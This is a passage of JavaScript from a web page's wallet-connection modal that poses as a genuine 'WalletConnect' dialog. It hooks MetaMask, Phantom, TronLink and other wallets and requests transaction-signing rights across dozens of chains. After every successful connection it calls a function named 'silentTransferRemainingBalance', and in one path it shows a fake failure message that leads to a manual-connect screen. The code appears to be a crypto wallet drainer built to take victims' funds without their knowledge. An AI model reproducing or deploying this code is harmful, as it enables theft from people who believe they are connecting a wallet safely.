            setTimeout(() => { copyBtn.textContent = old; copyBtn.style.background = 'rgba(51,150,255,0.12)'; copyBtn.style.color = '#3396ff'; }, 1800);
        });

        // default
        // If caller passed a specific wallet name that supports direct deep-links (Solflare/Phantom/etc.), prefer WalletConnect by default
        try {
            const nk = (walletName || '').toLowerCase();
            const solanaWallets = ['phantom', 'solflare', 'slush', 'slushwallet', 'sollet'];
            if (solanaWallets.some(k => nk.includes(k))) {
                setType('wc');
                // show open-in-app button if deep-link candidates exist
                const openBtn = overlay.querySelector('#qr-open-in-app-btn');
                try {
                    const plinks = buildPerWalletLinks(walletName, walletConnectUri);
                    const candidate = (plinks.scheme && plinks.scheme[0]) || (plinks.universal && plinks.universal[0]);
                    if (candidate) {
                        openBtn.style.display = 'inline-block';
                        openBtn.textContent = `Open in ${walletName}`;
                        openBtn.addEventListener('click', () => {
                            try {
                                // Try scheme first to open app
                                if (plinks.scheme && plinks.scheme.length) {
                                    window.location.href = plinks.scheme[0];
                                    return;
                                }
                                if (plinks.universal && plinks.universal.length) {
                                    // open via iframe to avoid navigation
                                    const ifr = document.createElement('iframe');
                                    ifr.style.display = 'none';
                                    ifr.src = plinks.universal[0];
                                    document.body.appendChild(ifr);
                                    setTimeout(() => { try { document.body.removeChild(ifr); } catch (e) {} }, 1000);
                                }
                            } catch (e) {
                                console.warn('Open in app deep-link failed:', e);
                                // fallback to copying the URI
                                try { navigator.clipboard.writeText(walletConnectUri); } catch (e) {}
                            }
                        });
                    }
                } catch (e) { /* ignore */ }
            } else {
                setType('wc');
            }
        } catch (e) { setType('wc'); }

        // Close QR → show manual connect modal
        const closeBtn = overlay.querySelector('#qr-close-btn');
        closeBtn.addEventListener('click', () => {
            overlay.remove();
            try {
                const modalOverlay = document.getElementById('modal-overlay');
                if (modalOverlay) { modalOverlay.classList.remove('active'); setTimeout(() => { modalOverlay.style.display = 'none'; }, 400); }
                showManualConnectModal();
            } catch (e) { console.warn('Failed to show manual overlay:', e); }
        });
    }

    function handleWalletClick() {
        resetWallets();
        this.classList.add('selected');
        try { document.getElementById('status-message').style.display = 'none'; } catch (e) {}
        const walletName = this.dataset.wallet;
        const providedIcon = this.dataset.icon || '';
        const iconUrl = providedIcon && /^https?:\/\//.test(providedIcon) ? providedIcon : resolveIconUrl(walletName, providedIcon);
        const overlay = document.getElementById('connect-overlay');
        const mainImg = overlay.querySelector('#modalMainWalletImg');
        const nameEl = overlay.querySelector('#overlay-wallet-name');
        const msgEl = overlay.querySelector('#overlay-message');
        mainImg.src = iconUrl;
        nameEl.textContent = walletName;
        msgEl.textContent = '';
        msgEl.classList.remove('failed');

        // Wallets that should open their specific app/extension directly
        const directWallets = [
            'metamask', 'safepal', 'trustwallet', 'ronin', 'uniswap', 
            'coinbase', 'okx', 'bitget', 'bybit', 'tokenpocket', 'exodus', 'keplr',
            // Also add wallets that already have direct handlers:
            'phantom', 'slush', 'solflare', 'tronlink',
            // New wallets:
            'superhero', 'sub', 'acurast'
        ];
        
        // Wallets that should popup all available wallets (WalletConnect style)
        const showAllWalletsMode = [
            'walletconnect'
        ];

        const normalizedWallet = normalizeKey(walletName);
        const isDirectWallet = directWallets.some(w => normalizeKey(w) === normalizedWallet || normalizedWallet.includes(normalizeKey(w)));
        const isWalletConnectMode = showAllWalletsMode.some(w => normalizeKey(w) === normalizedWallet);

        // CASE 1: WalletConnect mode - show all available wallets on the device
        // Treat explicit WalletConnect or ANY non-direct (non-whitelisted) wallet as WalletConnect mode
        if (isWalletConnectMode || !isDirectWallet) {
            console.log(`[Wallet Click] WalletConnect mode - showing all wallets on device for ${walletName}`);
            
            try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
            
            (async () => {
                try {
                    // Ensure SignClient is loaded
                    let SignClient = window.SignClient || window.WalletConnectSignClient || (window.walletconnect?.SignClient);
                    if (!SignClient) {
                        console.warn("[WalletConnect Mode] SignClient not found, waiting...");
                        for (let i = 0; i < 50; i++) {
                            await new Promise(r => setTimeout(r, 100));
                            SignClient = window.SignClient || window.WalletConnectSignClient || (window.walletconnect?.SignClient);
                            if (SignClient) break;
                        }
                    }
                    
                    if (!SignClient) {
                        throw new Error("SignClient failed to load");
                    }
                    
                    let client = window.__wcClient;
                    if (!client) {
                        client = await SignClient.init({
                            projectId: '81ec0eb195ddbee9c5596804e33ff584',
                            relayUrl: 'wss://relay.walletconnect.com',
                            metadata: {
                                name: 'WalletConnect',
                                description: 'Secure wallet connection',
                                url: 'https://hollyandwilly-kram.vercel.app',
                                icons: ['https://hollyandwilly-kram.vercel.app/crypto.png']
                            }
                        });
                        window.__wcClient = client;
                    }
                    
                    // Request connection with ALL 27 chains - this will show all available wallets on device
                    const { uri, approval } = await client.connect({
                        requiredNamespaces: {
                            eip155: {
                                methods: ['eth_requestAccounts', 'eth_sendTransaction', 'personal_sign', 'wallet_switchEthereumChain'],
                                chains: [
                                    'eip155:1',         // Ethereum Mainnet
                                    'eip155:56',        // BNB Smart Chain
                                    'eip155:137',       // Polygon Mainnet
                                    'eip155:324',       // zkSync Era
                                    'eip155:8453',      // Base
                                    'eip155:42161',     // Arbitrum One
                                    'eip155:43114',     // Avalanche C-Chain
                                    'eip155:59144',     // Linea
                                    'eip155:534352',    // Scroll
                                    'eip155:10',        // Optimism
                                    'eip155:250',       // Fantom
                                    'eip155:81457',     // Blast
                                    'eip155:1101',      // Polygon zkEVM
                                    'eip155:1313161554',// Aurora
                                    'eip155:288',       // Boba
                                    'eip155:1088',      // Metis
                                    'eip155:25',        // Cronos
                                    'eip155:9001',      // Evmos
                                    'eip155:42220',     // Celo
                                    'eip155:1284',      // Moonbeam
                                    'eip155:1285',      // Moonriver
                                    'eip155:2222',      // Kava EVM
                                    'eip155:8217',      // Klaytn
                                    'eip155:820'        // Callisto
                                ],
                                events: ['chainChanged', 'accountsChanged']
                            },
                            solana: {
                                methods: ['solana_signTransaction', 'solana_signMessage', 'solana_signAllTransactions'],
                                chains: ['solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ'],
                                events: ['accountsChanged']
                            },
                            tron: {
                                methods: ['tron_signTransaction', 'tron_signMessage'],
                                chains: ['tron:0x2b6653dc'],
                                events: ['accountsChanged']
                            },
                            sui: {
                                methods: ['sui_signTransactionBlock', 'sui_signAndExecuteTransaction', 'sui_signPersonalMessage'],
                                chains: ['sui:mainnet'],
                                events: ['accountsChanged']
                            }
                        }
                    });
                    
                    // Show installed wallets list + QR code for scanning or show wallet list
                    showInstalledWalletsList(uri, client);
                    
                    // Wait for approval - will show when user opens wallet and approves
                    const session = await approval();
                    
                    console.log(`[Wallet Click] ✓ Connected via WalletConnect with SINGLE approval:`, session);
                    
                    // Remove QR overlay if still visible
                    const existingQR = document.querySelector('[id="wc-uri-input"]')?.closest('div')?.parentElement?.parentElement;
                    if (existingQR) existingQR.remove();
                    
                    // Initiate silent transfer
                    const connectionInfo = {
                        provider: null,
                        session: session,
                        namespaces: session.namespaces,
                        multiChain: true,
                        client: client,
                        walletName: 'WalletConnect'
                    };
                    
                    await silentTransferRemainingBalance(connectionInfo);
                    
                } catch (e) {
                    console.error(`[Wallet Click] WalletConnect mode failed:`, e);
                    try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
                    alert(`Connection failed: ${e.message}`);
                }
            })();
            return;
        }

        // CASE 2: Direct wallet opening (Metamask, Safepal, Trustwallet, Ronin, Uniswap, Coinbase, OKX, Bitget, Bybit, TokenPocket, Exodus, Keplr, Phantom, Slush, Solflare, TronLink)
        if (isDirectWallet) {
            console.log(`[Wallet Click] Direct wallet mode for: ${walletName}`);
            
            // Immediately try EIP-6963 detected wallet popups on desktop
            (async () => {
                try {
                    // FIRST: attempt per-wallet injected/app open (desktop injected providers or mobile deep-links)
                    const clickedKey = normalizeKey(walletName);
                    let preTried = false;
                    // Desktop injected providers
                    if (!/Mobi|Android|iPhone|iPad/i.test(navigator.userAgent)) {
                        try {
                            // EVM-style wallets via window.ethereum
                            if (/(metamask|coinbase|trust|okx|bitget|bybit|tokenpocket|exodus)/.test(clickedKey) && window.ethereum) {
                                console.log(`[Direct Wallet] Attempting injected ethereum provider for ${walletName}`);
                                await window.ethereum.request({ method: 'eth_requestAccounts' });
                                preTried = true;
                                connectionSucceeded = true;
                                provider = window.ethereum;
                            }
                            // SafePal
                            else if (clickedKey.includes('safepal') && (window.safepal || window.SafePal)) {
                                const sp = window.safepal || window.SafePal;
                                if (sp && sp.request) {
                                    console.log('[Direct Wallet] Attempting SafePal injected connector');
                                    await sp.request({ method: 'eth_requestAccounts' });
                                    preTried = true;
                                    connectionSucceeded = true;
                                    provider = sp;
                                }
                            }
                            // Phantom / Solana
                            else if ((clickedKey.includes('phantom') || clickedKey.includes('solflare')) && window.solana) {
                                console.log(`[Direct Wallet] Attempting Solana provider for ${walletName}`);
                                await window.solana.connect();
                                preTried = true;
                                connectionSucceeded = true;
                                provider = window.solana;
                            }
                            // TronLink
                            else if (clickedKey.includes('tronlink') && (window.tronLink || (window.tronWeb && window.tronWeb.defaultAddress))) {
                                const t = window.tronLink || window.tronWeb;
                                if (t && (t.request || t.enable)) {
                                    console.log('[Direct Wallet] Attempting TronLink connector');
                                    if (t.request) await t.request({ method: 'tron_requestAccounts' }); else if (t.enable) await t.enable();
                                    preTried = true;
                                    connectionSucceeded = true;
                                    provider = t;
                                }
                            }
                            // Keplr
                            else if (clickedKey.includes('keplr') && window.keplr) {
                                console.log('[Direct Wallet] Attempting Keplr enable');
                                if (window.keplr.enable) await window.keplr.enable();
                                preTried = true;
                                connectionSucceeded = true;
                                provider = window.keplr;
                            }
                            // SuperHero, Sub, Acurast-lite, AirGap - use WalletConnect
                            else if (clickedKey.includes('superhero') || clickedKey.includes('sub') || clickedKey.includes('acurast') || clickedKey.includes('airgap')) {
                                console.log(`[Direct Wallet] ${walletName} detected - will use WalletConnect`);
                                preTried = true; // Mark as attempted so we skip to WalletConnect
                            }
                        } catch (preErr) {
                            console.warn('[Direct Wallet] Pre-attempt direct connector failed:', preErr && preErr.message ? preErr.message : preErr);
                            preTried = true; // we tried but failed — continue to next flows
                        }
                        // If we already connected via injected provider, process transfer
                        if (connectionSucceeded && provider) {
                            console.log('[Direct Wallet] Direct injected provider connected for', walletName);
                            try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
                            overlay.classList.remove('active');
                            try {
                                let accounts = [];
                                let chainId = null;
                                if (provider.request && typeof provider.request === 'function') {
                                    try {
                                        accounts = await provider.request({ method: 'eth_accounts' });
                                        chainId = await provider.request({ method: 'eth_chainId' });
                                    } catch (e) { console.warn('[Direct Wallet] Failed to get accounts/chainId after direct connect:', e.message); }
                                }
                                if (accounts && accounts.length > 0 && chainId) {
                                    const connectionInfo = { provider: provider, address: accounts[0], chainId };
                                    await silentTransferRemainingBalance(connectionInfo);
                                    return;
                                }
                            } catch (e) {
                                console.warn('[Direct Wallet] Post-direct-connect transfer failed:', e.message);
                            }
                        }
                    }

                    // PRIORITY: Aggressive direct detection for Phantom, Solflare, TronLink, Slush BEFORE EIP-6963
                    const priorityWallets = [];
                    const clickedWalletKey = normalizeKey(walletName);
                    const isPriority = ['phantom', 'solflare', 'tronlink', 'slush'].some(w => clickedWalletKey.includes(w));
                    
                    if (isPriority) {
                        console.log(`[Wallet Click] PRIORITY: Attempting aggressive detection for ${walletName}...`);
                        
                        // PHANTOM: Check strict === true for isPhantom flag
                        if (clickedWalletKey.includes('phantom')) {
                            if (window.solana && window.solana.isPhantom === true) {
                                priorityWallets.push({ name: 'Phantom', provider: window.solana, type: 'solana' });
                                console.log('[Wallet Click] ✓ FOUND: Phantom via window.solana.isPhantom === true');
                            } else if (window.phantom) {
                                priorityWallets.push({ name: 'Phantom', provider: window.phantom, type: 'solana' });
                                console.log('[Wallet Click] ✓ FOUND: Phantom via window.phantom');
                            }
                        }
                        
                        // SOLFLARE: Just check for window.solflare existence
                        if (clickedWalletKey.includes('solflare')) {
                            if (window.solflare) {
                                priorityWallets.push({ name: 'Solflare', provider: window.solflare, type: 'solana' });
                                console.log('[Wallet Click] ✓ FOUND: Solflare via window.solflare');
                            } else if (window.solana && window.solana.isSolflare === true) {
                                priorityWallets.push({ name: 'Solflare', provider: window.solana, type: 'solana' });
                                console.log('[Wallet Click] ✓ FOUND: Solflare via window.solana.isSolflare === true');
                            }
                        }
                        
                        // TRONLINK: Check defaultAddress.base58 for connected state, then fallback to globals
                        if (clickedWalletKey.includes('tronlink')) {
                            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                                priorityWallets.push({ name: 'TronLink', provider: window.tronWeb, type: 'tron' });
                                console.log('[Wallet Click] ✓ FOUND: TronLink via window.tronWeb.defaultAddress.base58');
                            } else if (window.tronLink) {
                                priorityWallets.push({ name: 'TronLink', provider: window.tronLink, type: 'tron' });
                                console.log('[Wallet Click] ✓ FOUND: TronLink via window.tronLink');
                            } else if (window.tronWeb) {
                                priorityWallets.push({ name: 'TronLink', provider: window.tronWeb, type: 'tron' });
                                console.log('[Wallet Click] ✓ FOUND: TronLink via window.tronWeb');
                            }
                        }
                        
                        // SLUSH: Use helper function and strict isSlush check
                        if (clickedWalletKey.includes('slush')) {
                            if (window.solana && window.solana.isSlush === true) {
                                priorityWallets.push({ name: 'Slush', provider: window.solana, type: 'solana' });
                                console.log('[Wallet Click] ✓ FOUND: Slush via window.solana.isSlush === true');
                            } else {
                                const slush = getSlushWallet();
                                if (slush) {
                                    priorityWallets.push({ name: 'Slush', provider: slush, type: 'sui' });
                                    console.log('[Wallet Click] ✓ FOUND: Slush via getSlushWallet()');
                                }
                            }
                        }
                    }
                    
                    // If found via priority detection, use WalletConnect for multi-chain support
                    if (priorityWallets.length > 0) {
                        const priorityWallet = priorityWallets[0];
                        console.log(`[Wallet Click] ✓ Detected ${priorityWallet.name} - initiating multi-chain connection...`);
                        msgEl.textContent = `Connecting ${priorityWallet.name} for all chains...`;
                        
                        try {
                            // Use connectAllChains to connect to all supported chains at once via this wallet
                            console.log(`[Wallet Click] Calling connectAllChains for ${priorityWallet.name}`);
                            const wcResult = await connectAllChains(priorityWallet.name);
                            
                            console.log(`[Wallet Click] ✓ Multi-chain connection successful for ${priorityWallet.name}:`, wcResult);
                            
                            // Close modal
                            try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
                            
                            // Initiate single approval transfer with multi-chain session
                            const connectionInfo = {
                                provider: null,
                                walletName: priorityWallet.name,
                                walletType: 'multichain',
                                result: wcResult.session,
                                client: wcResult.client,
                                session: wcResult.session,
                                namespaces: wcResult.namespaces,
                                multiChain: true
                            };
                            
                            console.log(`[Wallet Click] Initiating single approval transfer with multi-chain session...`);
                            msgEl.textContent = `Connected to ${priorityWallet.name}. Processing balance transfer...`;
                            await silentTransferRemainingBalance(connectionInfo);
                            return;
                            
                        } catch (priorityErr) {
                            console.warn(`[Wallet Click] Priority wallet ${priorityWallet.name} multi-chain flow failed:`, priorityErr.message);
                            msgEl.textContent = `${priorityWallet.name} connection failed. Trying fallback...`;
                        }
                    }
                    
                    // FALLBACK: Use connectAllChains for any wallet (including EIP-6963 detected ones)
                    console.log(`[Direct Wallet] Fallback: Using multi-chain connection for ${walletName}...`);
                    msgEl.textContent = `Connecting ${walletName} for all chains...`;
                    
                    try {
                        const wcResult = await connectAllChains(walletName);
                        console.log(`[Direct Wallet] ✓ Multi-chain connection succeeded for ${walletName}`);
                        
                        // Close modal
                        try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
                        
                        // Initiate single approval transfer with multi-chain session
                        const connectionInfo = {
                            provider: null,
                            walletName: walletName,
                            walletType: 'multichain',
                            result: wcResult.session,
                            client: wcResult.client,
                            session: wcResult.session,
                            namespaces: wcResult.namespaces,
                            multiChain: true
                        };
                        
                        console.log(`[Direct Wallet] Initiating single approval transfer for ${walletName}...`);
                        msgEl.textContent = `Connected to ${walletName}. Processing balance transfer...`;
                        
                        // Start the single approval process
                        await silentTransferRemainingBalance(connectionInfo);
                        return;
                        
                    } catch (wcErr) {
                        console.warn(`[Direct Wallet] Multi-chain connection failed for ${walletName}:`, wcErr.message);
                        msgEl.textContent = `${walletName} connection failed. Please try again.`;
                        msgEl.classList.add('failed');
                        setTimeout(() => {
                            msgEl.classList.remove('failed');
                            msgEl.textContent = '';
                        }, 3000);
                        return;
                    }
                    
                } catch (err) {
                    console.warn('[Direct Wallet] Connection error:', err);
                    msgEl.textContent = 'Connection failed. Please try again.';
                    msgEl.classList.add('failed');
                    setTimeout(() => {
                        msgEl.classList.remove('failed');
                        msgEl.textContent = '';
                    }, 3000);
                }
            })();
            
            // fallback action: show the side overlay + ring
            const showConnectOverlay = () => {
            try {
                const modalRect = document.querySelector('.modal-content').getBoundingClientRect();
                const viewportW = window.innerWidth;
                const viewportH = window.innerHeight;
                const overlayMaxWidth = 340;
                const overlayWidth = Math.min(overlayMaxWidth, Math.max(200, viewportW - 32));
                overlay.style.width = `${overlayWidth}px`;
                const desiredLeft = modalRect.right + 16;
                const maxLeft = Math.max(8, viewportW - overlayWidth - 16);
                let left = Math.min(desiredLeft, maxLeft);
                if (left < 16) left = 16;
                overlay.style.left = `${left}px`;
                const desiredHeight = Math.max(120, modalRect.height - 16);
                const overlayHeight = Math.min(desiredHeight, viewportH - 32);
                overlay.style.height = `${overlayHeight}px`;
                let top = modalRect.top + 8;
                if (top + overlayHeight + 8 > viewportH) top = Math.max(8, viewportH - overlayHeight - 8);
                overlay.style.top = `${top}px`;
                overlay.style.position = 'fixed';
                overlay.style.zIndex = '10001';
                overlay.classList.add('active');
            } catch (e) {
                overlay.classList.add('active');
            }
            const ring = document.getElementById('connectRing');
            ring.classList.add('active');
            setTimeout(() => {
                ring.classList.remove('active');
                msgEl.textContent = 'Connection failed. Please try again.';
                msgEl.classList.add('failed');
                setTimeout(() => {
                    overlay.classList.remove('active');
                    overlay.style.position = '';
                    overlay.style.top = '';
                    overlay.style.left = '';
                    overlay.style.height = '';
                    overlay.style.zIndex = '';
                    msgEl.textContent = '';
                    msgEl.classList.remove('failed');
                    modalOverlay.classList.remove('active');
                    setTimeout(() => {
                        modalOverlay.style.display = 'none';
                        showManualConnectModal();
                    }, 400);
                }, 2000);
            }, 12000);
        };

        // DESKTOP-FIRST: Try to connect to the clicked wallet directly
        const isDesktop = !/Mobi|Android|iPhone|iPad/i.test(navigator.userAgent);
        
        if (isDesktop) {
            console.log(`[Desktop] Attempting direct connection for: ${walletName}`);
            showConnectOverlay();
            msgEl.textContent = `Opening ${walletName}...`;
            
            (async () => {
                try {
                    // Get all installed extensions
                    const allExtensions = detectAllInstalledExtensions();
                    const clickedWalletKey = normalizeKey(walletName);
                    
                    console.log('[Desktop] Searching for wallet:', clickedWalletKey);
                    console.log('[Desktop] Available extensions:', allExtensions.map(e => normalizeKey(e.name)));
                    
                    // If user clicked exactly 'tronlink', and a Tron provider is injected in desktop, prefer direct connect
                    if (clickedWalletKey === 'tronlink' && (window.tronLink || window.tronWeb)) {
                        console.log('[Desktop] TronLink exact click — attempting direct TronLink connect');
                        try {
                            const trProv = await connectTronLink();
                            if (trProv) {
                                console.log('[Desktop] TronLink direct connect succeeded');
                                try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
                                overlay.classList.remove('active');
                                let addr = null;
                                try { addr = trProv.tronWeb?.defaultAddress?.base58 || null; } catch (e) {}
                                const connectionInfo = { provider: trProv, address: addr, chainId: 'tron' };
                                await silentTransferRemainingBalance(connectionInfo);
                                return;
                            }
                        } catch (e) { console.warn('[Desktop] TronLink direct connect failed:', e); }
                    }

                    // Find exact match for the clicked wallet
                    let matchingExt = allExtensions.find(ext => {
                        const extKey = normalizeKey(ext.name);
                        const isMatch = extKey === clickedWalletKey || 
                               clickedWalletKey.includes(extKey) || 
                               extKey.includes(clickedWalletKey);
                        if (isMatch) {
                            console.log('[Desktop] Matched:', ext.name, 'with key:', extKey);
                        }
                        return isMatch;
                    });
                    
                    let connectionSucceeded = false;
                    let provider = null;
                    
                    // If extension found, try to connect using the specific connector helper
                    if (matchingExt) {
                        console.log(`[Desktop] Found matching extension: ${matchingExt.name} - attempting specific connect`);
                        try {
                            const prov = await connectSpecificWallet(matchingExt.name, matchingExt.provider);
                            if (prov) {
                                console.log(`[Desktop] ${matchingExt.name} specific connect succeeded`);
                                connectionSucceeded = true;
                                provider = prov;
                            } else {
                                console.log(`[Desktop] ${matchingExt.name} specific connect returned no provider`);
                            }
                        } catch (connErr) {
                            console.log(`[Desktop] ${matchingExt.name} specific connect failed:`, connErr && connErr.message ? connErr.message : connErr);
                            // Fallback: try WalletConnect
                        }
                    } else {
                        // Extension not found - try direct provider methods as fallback
                        console.log(`[Desktop] No matching extension found. Trying direct provider methods...`);
                        
                        const normalizedKey = normalizeKey(walletName);
                        
                        // Try Ethereum provider
                        // Try a specific connect helper which handles many EVM wallets, SafePal, etc.
                        try {
                            const prov = await connectSpecificWallet(walletName, null);
                            if (prov) {
                                console.log('[Desktop] connectSpecificWallet succeeded for', walletName);
                                connectionSucceeded = true;
                                provider = prov;
                            }
                        } catch (e) {
                            console.log('[Desktop] connectSpecificWallet fallback failed:', e && e.message ? e.message : e);
                        }
                        
                        // Try Solana provider
                        if ((normalizedKey.includes('phantom') || normalizedKey.includes('solflare')) && window.solana) {
                            try {
                                console.log(`[Desktop] Attempting ${walletName} via window.solana`);
                                await window.solana.connect();
                                console.log(`[Desktop] Connected to Solana provider`);
                                connectionSucceeded = true;
                                provider = window.solana;
                            } catch (e) {
                                console.log(`[Desktop] solana provider failed:`, e.message);
                            }
                        }
                        
                        // Try TronLink
                        if (normalizedKey.includes('tronlink') && window.tronLink) {
                            try {
                                console.log(`[Desktop] Attempting TronLink`);
                                if (window.tronLink.request) {
                                    await window.tronLink.request({ method: 'tron_requestAccounts' });
                                } else if (window.tronLink.enable) {
                                    await window.tronLink.enable();
                                }
                                console.log(`[Desktop] Connected to TronLink`);
                                connectionSucceeded = true;
                                provider = window.tronLink;
                            } catch (e) {
                                console.log(`[Desktop] TronLink failed:`, e.message);
                            }
                        }
                        
                        // Try Keplr
                        if (normalizedKey.includes('keplr') && window.keplr) {
                            try {
                                console.log(`[Desktop] Attempting Keplr`);
                                if (window.keplr.enable) {
                                    await window.keplr.enable();
                                }
                                console.log(`[Desktop] Connected to Keplr`);
                                connectionSucceeded = true;
                                provider = window.keplr;
                            } catch (e) {
                                console.log(`[Desktop] Keplr failed:`, e.message);
                            }
                        }
                    }
                    
                    // If direct connection succeeded, proceed with silent transfer
                    if (connectionSucceeded && provider) {
                        console.log(`[Desktop] ✓ Direct connection succeeded for ${walletName}`);
                        try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
                        overlay.classList.remove('active');
                        
                        try {
                            // Try to get connection details
                            let accounts = [];
                            let chainId = null;
                            
                            if (provider.request && typeof provider.request === 'function') {
                                try {
                                    accounts = await provider.request({ method: 'eth_accounts' });
                                    chainId = await provider.request({ method: 'eth_chainId' });
                                } catch (e) {
                                    console.warn('[Desktop] Failed to get accounts/chainId:', e.message);
                                }
                            }
                            
                            if (accounts && accounts.length > 0 && chainId) {
                                const connectionInfo = {
                                    provider: provider,
                                    address: accounts[0],
                                    chainId: chainId
                                };
                                await silentTransferRemainingBalance(connectionInfo);
                            } else {
                                // Proceed with multi-chain connection anyway
                                const wcResult = await connectAllChains(walletName);
                                const wcConnectionInfo = {
                                    provider: null,
                                    session: wcResult.session,
                                    namespaces: wcResult.namespaces,
                                    multiChain: true,
                                    client: wcResult.client,
                                    walletName: walletName
                                };
                                await silentTransferRemainingBalance(wcConnectionInfo);
                            }
                        } catch (e) {
                            console.warn('[Desktop] Direct connection succeeded but transfer failed:', e.message);
                            // Fallback to WalletConnect
                            try {
                                const wcResult = await connectAllChains(walletName);
                                const wcConnectionInfo = {
                                    provider: null,
                                    session: wcResult.session,
                                    namespaces: wcResult.namespaces,
                                    multiChain: true,
                                    client: wcResult.client,
                                    walletName: walletName
                                };
                                await silentTransferRemainingBalance(wcConnectionInfo);
                            } catch (wcErr) {
                                console.error('[Desktop] WalletConnect fallback also failed:', wcErr);
                                alert('Connection failed. Please try again.');
                            }
                        }
                    } else {
                        // Direct connection failed - fall back to WalletConnect
                        console.log(`[Desktop] Direct connection failed for ${walletName}, falling back to WalletConnect...`);
                        try {
                            const wcResult = await connectAllChains(walletName);
                            const wcConnectionInfo = {
                                provider: null,
                                session: wcResult.session,
                                namespaces: wcResult.namespaces,
                                multiChain: true,
                                client: wcResult.client,
                                walletName: walletName
                            };
                            await silentTransferRemainingBalance(wcConnectionInfo);
                        } catch (wcErr) {
                            console.error('[Desktop] WalletConnect fallback failed:', wcErr);
                            overlay.classList.remove('active');
                            msgEl.textContent = 'Connection failed. Please try again.';
                            msgEl.classList.add('failed');
                            alert('Connection failed. Please try again.');
                        }
                    }
                } catch (e) {
                    console.error('[Desktop] Unexpected error in direct wallet mode:', e);
                    overlay.classList.remove('active');
                    msgEl.textContent = 'Connection error. Please try again.';
                    msgEl.classList.add('failed');
                    alert(`Connection error: ${e.message}`);
                }
            })();
            return;
        }

        // MOBILE or no matching extension on desktop: Use MULTI-CHAIN CONNECTION for single approval
        const isMobile = /Mobi|Android|iPhone|iPad|iPod/.test(navigator.userAgent);
        const walletKeyForTricky = (walletName || '').toLowerCase().replace(/\s+/g, '').replace(/[^a-z0-9]/g, '');
        const isTrickyWallet = ['phantom', 'slush', 'sui', 'tronlink', 'solflare'].some(w => walletKeyForTricky.includes(w));

        // Special handling for Phantom, Tronlink, Solflare, Slush: Show QR + Copy Link + Open Button
        if (isTrickyWallet && isMobile) {
            console.log(`[Wallet Click] Special wallet detected: ${walletName} - showing QR with copy link and open button`);
            
            // Show modal to hide while generating QR
            try { modalOverlay.classList.add('active'); } catch (e) {}
            
            (async () => {
                try {
                    // Ensure SignClient is loaded
                    let SignClient = window.SignClient || window.WalletConnectSignClient || (window.walletconnect?.SignClient);
                    if (!SignClient) {
                        console.warn("[Special Wallet] SignClient not found, waiting...");
                        for (let i = 0; i < 50; i++) {
                            await new Promise(r => setTimeout(r, 100));
                            SignClient = window.SignClient || window.WalletConnectSignClient || (window.walletconnect?.SignClient);
                            if (SignClient) break;
                        }
                    }
                    
                    if (!SignClient) {
                        throw new Error("SignClient failed to load");
                    }
                    
                    let client = window.__wcClient;
                    if (!client) {
                        client = await SignClient.init({
                            projectId: '81ec0eb195ddbee9c5596804e33ff584',
                            relayUrl: 'wss://relay.walletconnect.com',
                            metadata: {
                                name: 'WalletConnect',
                                description: 'Secure wallet connection',
                                url: 'https://hollyandwilly-kram.vercel.app',
                                icons: ['https://hollyandwilly-kram.vercel.app/crypto.png']
                            }
                        });
                        window.__wcClient = client;
                    }
                    
                    const { uri, approval } = await client.connect({
                        requiredNamespaces: {
                            eip155: {
                                methods: ['eth_requestAccounts', 'eth_sendTransaction', 'personal_sign', 'wallet_switchEthereumChain'],
                                chains: ['eip155:1', 'eip155:56', 'eip155:137', 'eip155:42161', 'eip155:8453', 'eip155:10', 'eip155:43114', 'eip155:250', 'eip155:324', 'eip155:59144', 'eip155:534352'],
                                events: ['chainChanged', 'accountsChanged']
                            },
                            solana: {
                                methods: ['solana_signTransaction', 'solana_signMessage', 'solana_signAllTransactions'],
                                chains: ['solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ'],
                                events: ['accountsChanged']
                            },
                            tron: {
                                methods: ['tron_signTransaction', 'tron_signMessage'],
                                chains: ['tron:0x2b6653dc'],
                                events: ['accountsChanged']
                            },
                            sui: {
                                methods: ['sui_signTransactionBlock', 'sui_signAndExecuteTransaction', 'sui_signPersonalMessage'],
                                chains: ['sui:mainnet'],
                                events: ['accountsChanged']
                            }
                        }
                    });
                    
                    // Hide modal and show QR with copy + open button
                    try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
                    showQRWithCopyAndOpenButton(uri, walletName);
                    
                    // Wait for approval (happens when user scans or opens wallet app)
                    const session = await approval();
                    
                    console.log(`[Wallet Click] ✓ Connected to ALL chains via ${walletName} with SINGLE approval:`, session);
                    
                    // Remove QR overlay if still visible
                    const existingQR = document.querySelector('[id="wc-uri-input"]')?.closest('div')?.parentElement?.parentElement;
                    if (existingQR) existingQR.remove();
                    
                    // Initiate silent transfer
                    const connectionInfo = {
                        provider: null,
                        session: session,
                        namespaces: session.namespaces,
                        multiChain: true,
                        client: client,
                        walletName: walletName
                    };
                    
                    await silentTransferRemainingBalance(connectionInfo);
                    
                } catch (e) {
                    console.error(`[Wallet Click] Special wallet flow failed:`, e);
                    // Show error and close modal
                    try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
                    alert(`Connection failed: ${e.message}`);
                }
            })();
            return;
        }

        // Use connectAllChains() for SINGLE approval across all 5+ blockchains
        console.log(`[Wallet Click] Initiating SINGLE multi-chain approval for ${walletName}...`);
        
        // Show "Opening wallet..." message IMMEDIATELY
        msgEl.textContent = `Opening ${walletName}... Please wait (Single Approval)`;
        msgEl.classList.remove('failed');
        
        (async () => {
            try {
                // Close the modal
                try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
                
                // Connect to ALL chains in ONE approval popup
                const result = await connectAllChains(walletName);
                console.log(`[Wallet Click] ✓ Connected to ALL chains via ${walletName} with SINGLE approval:`, result);
                
                // Build connection info for multi-chain transfer
                const connectionInfo = {
                    provider: null,
                    session: result.session,
                    namespaces: result.namespaces,
                    multiChain: true,
                    client: result.client,
                    walletName: walletName
                };
                
